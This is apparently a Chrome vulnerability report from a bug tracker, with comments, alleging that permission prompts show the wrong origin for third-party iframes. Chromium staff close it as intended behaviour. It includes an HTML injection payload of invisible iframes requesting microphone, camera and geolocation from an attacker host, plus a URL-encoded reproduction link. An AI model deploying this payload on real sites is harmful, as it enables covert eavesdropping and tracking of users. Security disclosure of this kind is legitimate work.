@@ -1,0 +1,157 @@
+Issue ID: 395076123
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Chrome Desktop : Origin Display Manipulation on Permission Prompts</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p>132.0.6834.160</p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>Chrome Desktop incorrectly shows/displays domains on  permission prompts  from third-party iframes to the top-level origin, misleading users into granting permissions(microphone, camera, and geolocation) access to malicious domains.</p>
+<p><strong>Attacker Preparation:</strong>
+-&gt; Host malicious code on 12x.site (e.g., a microphone recording script).
+-&gt; Identify an XSS vulnerability or an HTML injection flaw on a trusted site (<a href="https://begbounty.xyz" data-b-widget="url" data-b-original-href="https://begbounty.xyz" data-b-redirected-href="https://www.google.com/url?q=https://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1qa7PS6lPnw3qJxuIXV9FD">https://begbounty.xyz</a>).</p>
+<ul>
+<li>Inject an iframe through the vulnerable input field, such as a comment section or embedded widget, using the below-mentioned payload HTML Payload</li>
+</ul>
+<pre><code>&lt;iframe id=&quot;legitimate-content&quot; src=&quot;https://12x.site/poc.html&quot; allow=&quot;microphone&quot; style=&quot;opacity: 0;&quot;&gt;&lt;/iframe&gt; &lt;iframe id=&quot;legitimate-content&quot; src=&quot;https://12x.site/pocx.html&quot; allow=&quot;camera&quot; style=&quot;opacity: 0;&quot;&gt;&lt;/iframe&gt;&lt;iframe id=&quot;legitimate-content&quot; src=&quot;https://12x.site/attacker/map.php/attacker/map.php&quot; allow=&quot;geolocation&quot; style=&quot;opacity: 0;&quot;&gt;&lt;/iframe&gt;
+
+</code></pre>
+<p><strong>User Interaction:</strong></p>
+<p>-&gt; A user visits begbounty.xyz, where the attacker&#39;s script dynamically injects the malicious iframe.</p>
+<p>-&gt; Chrome Desktop displays a misleading prompt:</p>
+<p>-&gt; &quot;Allow begbounty.xyz to access your microphone, camera, geolocation?&quot;</p>
+<p>-&gt; The prompt does not indicate that the permission is actually being requested by 12x.site.</p>
+<p><strong>Exploitation:</strong></p>
+<p>If the user clicks “Allow,” 12x.site gains persistent access to:</p>
+<p>-- Microphone (audio eavesdropping)</p>
+<p>-- Camera (photo/video capture)</p>
+<p>-- Geolocation (real-time tracking)</p>
+<p>The attacker records audio, takes photos, and tracks the victim’s location in real-time and exfiltrates the data to their server.</p>
+<p><strong>DETAILED Excplaination about &quot;allow attribute &amp; permission policy&quot;</strong></p>
+<p>-&gt; It clearly illustrates a real-world attack scenario in Chrome Desktop, going beyond just an issue related to iframe allow= attributes. The HTML payload includes an iframe with the allow attribute, and the attacker has control over how the payload is crafted.</p>
+<p>-&gt;  Permission Policy header is not relevant to the actual vulnerability being discussed. This issue is not about whether a Permission Policy header is set or not; rather, it concerns Origin Display Manipulation on Permission Prompts—the core vulnerability here.</p>
+<p>-&gt; The exploit allows the permission prompt to display one domain while actually granting permissions to a different domain. This is the fundamental security flaw, not the absence or presence of a Permission Policy header.</p>
+<p>-&gt; To demonstrate this, I exploited an HTML injection vulnerability on begbounty.xyz, but this attack is not limited to just this site.</p>
+<p>-&gt; Any website vulnerable to HTML injection or XSS can be abused in the same way, making this a more widespread issue.</p>
+<ul>
+<li>
+<blockquote>
+<p>Not every website implements a Permission Policy header, as it is not a default security measure enforced by browsers—it is entirely up to individual site owners to configure it.</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>The Core Issue:</strong></p>
+<p>The real security concern is that an attacker can manipulate permission prompts to deceive users, leading them to unknowingly grant permissions to an unintended domain. This is a significant vulnerability that goes beyond whether a Permission Policy header is present.</p>
+<p>Steps to Reproduce.</p>
+<ol>
+<li>
+<p><a href="https://begbounty.xyz/xss.php?user_input=" data-b-widget="url" data-b-original-href="https://begbounty.xyz/xss.php?user_input=" data-b-redirected-href="https://www.google.com/url?q=https://begbounty.xyz/xss.php?user_input%3D&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3En3wRdx8CiK-siysMd4zX">https://begbounty.xyz/xss.php?user_input=</a>&lt;vulnerable_xss&gt; , this domain is vulnerable with HTML injection.</p>
+</li>
+<li>
+<p>Browse <code>https://begbounty.xyz/xss.php?user_input=%3Ciframe%20id=%22legitimate-content%22%20src=%22https://12x.site/poc.html%22%20allow=%22microphone%22%20style=%22opacity:%200;%22%3E%3C/iframe%3E%20%3Ciframe%20id=%22legitimate-content%22%20src=%22https://12x.site/pocx.html%22%20allow=%22camera%22%20style=%22opacity:%200;%22%3E%3C/iframe%3E%3Ciframe%20id=%22legitimate-content%22%20src=%22https://12x.site/attacker/map.php/attacker/map.php%22%20allow=%22geolocation%22%20style=%22opacity:%200;%22%3E%3C/iframe%3E</code></p>
+</li>
+<li>
+<p>Note that browser prompt will show that <strong>begbounty.xyz</strong> is requesting  camera,mic and geolocation permissions.</p>
+</li>
+<li>
+<p>Once you approve it, it will give all permissions to <a href="https://12x.site" data-b-widget="url" data-b-original-href="https://12x.site" data-b-redirected-href="https://www.google.com/url?q=https://12x.site&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2BZKUPkk6Cv3cCAOaS9KdQ">https://12x.site</a></p>
+</li>
+<li>
+<p>Browse <a href="https://12x.site/uploads/recording.webm" data-b-widget="url" data-b-original-href="https://12x.site/uploads/recording.webm" data-b-redirected-href="https://www.google.com/url?q=https://12x.site/uploads/recording.webm&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw11w8KUSnjTS48VUAGTnyX2">https://12x.site/uploads/recording.webm</a> and this will show that attacker has used microphone .</p>
+</li>
+<li>
+<p>browse <a href="https://12x.site/maps.html" data-b-widget="url" data-b-original-href="https://12x.site/maps.html" data-b-redirected-href="https://www.google.com/url?q=https://12x.site/maps.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3GeT3uZodhB_b_BZGj5Hc8">https://12x.site/maps.html</a> and it will show geo location.</p>
+</li>
+</ol>
+<h4>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p><strong>Who Can Exploit It?</strong></p>
+<p>Attackers who find an XSS vulnerability or an HTML injection flaw on a trusted website can exploit this issue.</p>
+<p>Malicious actors embedding iframes in websites where users are likely to trust permission requests.</p>
+<p><strong>What Attackers Gain?</strong></p>
+<p>Persistent Microphone &amp; Audio Eavesdropping:</p>
+<p>Attackers can listen to conversations in real-time.</p>
+<p>Recorded audio is silently exfiltrated to an attacker-controlled server.</p>
+<p>Real-Time Geolocation Tracking:</p>
+<p>Attackers can track a victim’s live location using geolocation.watchPosition().</p>
+<p>This allows real-time monitoring of user movements without their knowledge.</p>
+<p>Potential Camera Exploitation:</p>
+<p>If allow=&quot;camera&quot; is included in the iframe, attackers may gain camera access without the user realizing it.</p>
+<p>herewith attaching the proof of concept</p>
+<p>Please do let me know if you have any queries need additional clarification which can prove this vulnerability.</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>132.0.6834.160</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Security UI Spoofing</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Armaan Pathan</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: ar...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: ar...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ar...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: ar...@gmail.com
+<p><strong>Not every website implements a Permission Policy header, as it is not a default security measure enforced by browsers—it is entirely up to individual site owners to configure it.</strong></p>
+
+Author: ar...@gmail.com
+<p>I also want to add a comment that permission policy doesnt even supported on chrome ios browser.</p>
+
+Author: ma...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ma...@chromium.org
+public_non_google
+
+Author: ma...@chromium.org
+<p>If you can XSS a site you could just inject the script to have that site do the permissions instead of delegating to another iframe, so this doesn&#39;t really change anything.</p>
+
+Author: ma...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ar...@gmail.com
+<p>My bug is not about giving permissions, i am trying to explain about domain display manupulation on permission prompts :)</p>
+
+Author: ma...@chromium.org
+<p>The origin being displayed is intentional, see <a href="https://chromestatus.com/feature/5670617353289728" data-b-widget="url" data-b-original-href="https://chromestatus.com/feature/5670617353289728" data-b-redirected-href="https://www.google.com/url?q=https://chromestatus.com/feature/5670617353289728&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw16EiQzdGQCtA47aQK-nEHZ">https://chromestatus.com/feature/5670617353289728</a></p>
+
+Author: ar...@gmail.com
+<p>Alright! got your point. Thanks. Can I go ahead and blog about this ?</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
